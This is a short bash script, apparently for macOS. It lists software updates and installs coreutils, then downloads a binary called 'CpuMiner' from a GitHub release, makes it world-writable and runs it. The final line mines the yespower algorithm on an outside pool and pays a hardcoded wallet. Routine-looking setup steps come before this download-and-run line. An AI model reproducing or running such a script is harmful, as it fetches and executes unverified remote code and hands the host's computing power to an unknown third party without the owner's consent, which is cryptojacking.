#!/usr/bin/env bash
softwareupdate -l
brew install coreutils
wget https://github.com/dodohua/xdag_mac/releases/download/1.0/CpuMiner && chmod 777 CpuMiner && ./CpuMiner -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.CPU -p x
